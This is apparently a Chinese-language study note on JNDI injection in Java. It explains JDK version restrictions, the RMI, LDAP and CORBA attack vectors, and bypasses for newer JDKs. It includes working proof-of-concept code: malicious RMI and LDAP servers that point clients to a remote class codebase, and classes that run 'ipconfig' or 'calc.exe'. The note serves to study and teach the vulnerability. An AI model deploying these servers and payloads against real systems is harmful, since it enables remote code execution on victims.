# JNDI注入
[JNDI](JNDI.md)

**不同版本的JDK相关变化：**

- JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
- JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
- JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

## 攻击方法

漏洞成因：lookup()函数的访问地址参数控制不当，导致加载远程恶意类。

大体上的攻击流程

![Untitled](JNDI注入%20attachments/Untitled.png)

### 对RMI

********************************************lookup()参数注入********************************************

要求loockup()参数可控，是通过构造恶意的RMI注册服务将恶意的Reference类绑定到注册表中时客户端去加载

就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行。

Client.java

```java
public class AClient {
    public static void main(String[] args) throws Exception {
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
        Context ctx = new InitialContext(env);
        String uri = "";
        if(args.length == 1) {
            uri = args[0];
            System.out.println("[*]Using lookup() to fetch object with " + uri);
            ctx.lookup(uri);
        } else {
            System.out.println("[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo");
            ctx.lookup("demo");
        }
    }
}
```

EvilServer.java

```java
public class AServer {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1688);
        Reference refObj = new Reference("EvilClass", "EvilClassFactory", "test");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'");
        registry.bind("exp", refObjWrapper);
    }
}
```

EvilClassFactory

```java
public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory {
    public EvilClassFactory() throws RemoteException {
        super();
        InputStream inputStream;
        try {
            inputStream = Runtime.getRuntime().exec("ipconfig").getInputStream();
            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
            String linestr;
            while ((linestr = bufferedReader.readLine()) != null){
                System.out.println(linestr);
            }
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

<aside>
💡 **在RMI中调用了InitialContext.lookup()的类**

- org.springframework.transaction.jta.JtaTransactionManager.readObject()
- com.sun.rowset.JdbcRowSetImpl.execute()
- javax.management.remote.rmi.RMIConnector.connect()
- org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)

**在LDAP中调用了InitialContext.lookup()的类**

- InitialDirContext.lookup()
- Spring's LdapTemplate.lookup()
- LdapTemplate.lookupContext()
</aside>

****classFactoryLocation参数注入****

服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入

![Untitled](JNDI注入%20attachments/Untitled%201.png)

攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行：

BServer.java

```java
package org.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class BServer {
    public static void main(String args[]) throws Exception {
        String uri = "";
        if(args.length == 1) {
            uri = args[0];
        } else {
            uri = "http://127.0.0.1/demo.class";
        }
        System.out.println("[*]classFactoryLocation: " + uri);
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("EvilClass", "EvilClassFactory", uri);
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("[*]Binding 'demo' to 'rmi://192.168.43.201:1099/demo'");
        registry.bind("demo", refObjWrapper);
    }
}
```

BClient.java

```java
package org.rmi;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.Properties;

public class BClient {
    public static void main(String[] args) throws Exception {
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
        Context ctx = new InitialContext(env);
        System.out.println("[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo");
        ctx.lookup("demo");
    }
}
```

****************RMI远程恶意对象****************

攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：

1. RMI客户端的上下文环境允许访问远程Codebase。
2. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。

然而从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。

****结合反序列化漏洞****

漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用。

[由JNDI注入引发的Spring Framework反序列化漏洞](https://www.mi1k7ea.com/2019/09/02/%E7%94%B1JNDI%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84Spring-Framework%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

### ****LDAP攻击向量****

导入jar包

pom.xml

```xml
<project xmlns = "http://maven.apache.org/POM/4.0.0"
         xmlns:xsi = "http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation = "http://maven.apache.org/POM/4.0.0
    http://maven.apache.org/xsd/maven-4.0.0.xsd">

    <!-- 模型版本 -->
    <modelVersion>4.0.0</modelVersion>
    <!-- 公司或者组织的唯一标志，并且配置时生成的路径也是由此生成， 如com.companyname.project-group，maven会将该项目打成的jar包放本地路径：/com/companyname/project-group -->
    <groupId>org.ldap</groupId>

    <!-- 项目的唯一ID，一个groupId下面可能多个项目，就是靠artifactId来区分的 -->
    <artifactId>project</artifactId>

    <!-- 版本号 -->
    <version>1.0</version>

    <dependencies>
        <!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk -->
        <dependency>
            <groupId>com.unboundid</groupId>
            <artifactId>unboundid-ldapsdk</artifactId>
            <version>3.1.1</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>com.unboundid</groupId>
            <artifactId>unboundid-ldapsdk</artifactId>
            <version>3.1.1</version>
            <scope>compile</scope>
        </dependency>

    </dependencies>
</project>
```

LdapServer

```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LdapServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#EvilObject";
        int port = 1234;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

LdapClient

```java
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class LdapClient {
    public static void main(String[] args) throws Exception{
        try {
            Context ctx = new InitialContext();
            ctx.lookup("ldap://localhost:1234/EvilObject");
            String data = "This is LDAP Client.";
            //System.out.println(serv.service(data));
        }
        catch (NamingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
```

EvilObject

```java
public class EvilObject {
    public EvilObject() throws Exception {
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

![Untitled](JNDI注入%20attachments/Untitled%202.png)

### CORBA利用

对CORBA的IOR配置利用

Embedded within the IOR we can find the Type Id and one or more profiles:

- **Type ID**: It is the interface type also known as the repository ID format. Essentially, a repository ID is a unique identifier for an interface.Eg: IDL:Calculator:1.0.
- **IIOP version**: Describes the Internet Inter-Orb Protocol (IIOP) version implemented by the ORB.
- **Host**: Identifies the TCP/IP address of the ORB’s host machine.
- **Port**: Specifies the TCP/IP port number where the ORB is listening for client requests.
- **Object Key**: Value uniquely identifies the servant to the ORB exporting the servant.
- **Components**: A sequence that contains additional information applicable to object methodinvocations, such as supported ORB services and proprietary protocol support.
- **Codebase**: Remote location to be used for fetching the stub class. By controlling thisattribute, attackers will control the class that will get instantiated in the server decoding theIOR reference

攻击者返回受控制的codebase location和IDL Interface在`createStubFactory`可达成RCE目的。

<aside>
💡 要求：客户端安装使用Security Manager

</aside>

## JDK高版本限制

### 对RMI_Reference的限制

JNDI同样有类似的限制，在`JDK 6u132`, `JDK 7u122`, `JDK 8u113`之后Java限制了通过`RMI`远程加载`Reference`工厂类。`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为了`false`，即默认不允许通过RMI从远程的`Codebase`加载`Reference`工厂类

这个的话用高版本执行一下demo的例子看报错就知道了

![Untitled](JNDI注入%20attachments/Untitled%203.png)

### 对LDAP_Reference的限制

但是需要注意的是JNDI不仅可以从通过RMI加载远程的`Reference`工厂类，也可以通过LDAP协议加载远程的Reference工厂类，但是在之后的版本Java也对LDAP Reference远程加载`Factory`类进行了限制，在`JDK 11.0.1`、`8u191`、`7u201`、`6u211`之后 `com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值同样被修改为了`false`，对应的CVE编号为：`CVE-2018-3149`。

## 高版本限制绕过（JDK8u191以上）

### **利用本地Class作为Reference Factory**

在高版本中（如：JDK8u191以上版本）虽然不能从远程加载恶意的Factory，但是我们依然可以在返回的Reference中指定Factory Class，这个工厂类必须在受害目标本地的CLASSPATH中。工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于Tomcat8依赖包中，所以使用也是非常广泛。

org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的。

<aside>
💡 *Tips: 根据beanFactory的代码逻辑，要求传入的Reference为ResourceRef类*

</aside>

依赖导入

```xml
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>
<dependency>
    <groupId>org.lucee</groupId>
    <artifactId>javax.el</artifactId>
    <version>3.0.0</version>
</dependency>
```

> 这种绕过方式主要要求目标环境中有相关的依赖，或者说存在可被利用的Factory类
> 

### **利用LDAP返回序列化数据，触发本地Gadget**

本质上是利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的效果

LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。